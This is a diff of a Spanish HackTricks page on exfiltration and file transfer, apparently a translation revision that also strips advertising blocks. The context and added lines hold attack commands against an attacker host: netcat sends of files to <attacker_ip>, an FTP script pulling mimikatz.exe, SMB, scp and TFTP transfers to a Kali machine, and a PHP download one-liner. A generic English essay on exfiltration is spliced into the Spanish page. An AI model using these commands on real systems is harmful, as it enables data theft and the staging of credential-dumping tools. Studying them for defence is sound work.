@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
@@ -13,14 +13,6 @@ Otras formas de apoyar a HackTricks:
 * **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encuentra vulnerabilidades que son más importantes para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
 
 ## Dominios comúnmente permitidos para exfiltrar información
 
@@ -161,14 +153,6 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## SMB
 
 Kali como servidor
@@ -193,23 +177,38 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows
+# Exfiltration
 
----
+## Introduction
 
-### Exfiltration
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using command and control (C2) channels, exfiltrating data over DNS, or leveraging legitimate services like Dropbox for data exfiltration.
 
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
+## Techniques
 
-1. **Email**: Sending data as email attachments.
-2. **FTP**: Transferring data using the File Transfer Protocol.
-3. **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
-4. **DNS**: Encoding data within DNS requests.
-5. **Steganography**: Hiding data within images or other files.
-6. **Cloud Storage**: Uploading data to cloud storage services.
-7. **Physical Media**: Copying data to removable storage devices.
+### Command and Control (C2) Channels
 
-It is important for attackers to choose exfiltration methods that are less likely to be detected by security measures in place.
+C2 channels are commonly used by attackers to exfiltrate data from compromised systems. These channels allow the attacker to maintain control over the compromised system and exfiltrate data without being detected.
+
+### DNS Exfiltration
+
+DNS exfiltration involves encoding data within DNS queries or responses to exfiltrate data from a target network. This technique can be used to bypass network security controls that may not inspect DNS traffic.
+
+### Leveraging Legitimate Services
+
+Attackers may leverage legitimate services like Dropbox, Google Drive, or OneDrive to exfiltrate data from a target system. By using these services, attackers can blend in with normal network traffic and avoid detection.
+
+## Tools and Resources
+
+There are various tools and resources available to facilitate data exfiltration, including:
+
+- **Cobalt Strike**: A popular tool used by red teams for post-exploitation activities, including data exfiltration.
+- **PowerShell Empire**: An open-source post-exploitation framework that can be used for exfiltrating data from compromised systems.
+- **Cloud Storage Services**: Services like Dropbox, Google Drive, and OneDrive can be leveraged for data exfiltration.
+- **Steganography Tools**: Tools that can be used to hide data within images or other files for exfiltration purposes.
+
+## Conclusion
+
+Exfiltration is a critical phase of the cyber attack lifecycle, allowing attackers to steal valuable data from target systems. By understanding exfiltration techniques and leveraging appropriate tools and resources, security professionals can better defend against data exfiltration attempts.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -225,7 +224,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
+Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima al atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -237,23 +236,27 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 
 #### Description
 
-The Netcat utility can be used for exfiltration by creating a reverse shell to send data from the target machine to the attacker's machine. This can be achieved by setting up a listener on the attacker's machine and then executing a command on the target machine to connect back to the listener.
+The Netcat (NC) utility can be used for exfiltration by creating a reverse shell or transferring files over a network connection. This can be achieved by setting up a listener on an attacker-controlled machine and connecting to it from the compromised system using Netcat.
 
-#### Usage
+#### Methodology
 
-On the attacker's machine:
+1. **Setting Up the Listener**: On the attacker's machine, set up a listener using Netcat to receive the exfiltrated data.
+
 ```bash
-nc -lvp <port> > exfiltrated_data
+nc -lvp <port> > received_data
 ```
 
-On the target machine:
+2. **Sending Data**: On the compromised system, use Netcat to connect to the attacker's machine and send the data.
+
 ```bash
-nc <attacker_ip> <port> < exfiltrated_data
+nc <attacker_ip> <port> < file_to_send
 ```
+
+3. **Receiving Data**: The data will be received on the attacker's machine and saved in the specified file (`received_data` in this case).
 
 #### Detection
 
-Monitoring network traffic for suspicious connections to and from the target machine can help detect exfiltration using Netcat. Additionally, monitoring for unusual outbound network connections from the target machine can also indicate potential data exfiltration.
+Monitoring network traffic for suspicious connections to and from systems can help in detecting exfiltration using Netcat. Additionally, monitoring for unusual file transfers or spikes in outbound network traffic can also indicate potential data exfiltration activities.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -320,7 +323,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descargar un archivo con un PHP oneliner:
+Descarga un archivo con un PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -376,16 +379,10 @@ Luego copia y pega el texto en la ventana de comandos de Windows y se creará un
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 
 <details>
 
-<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
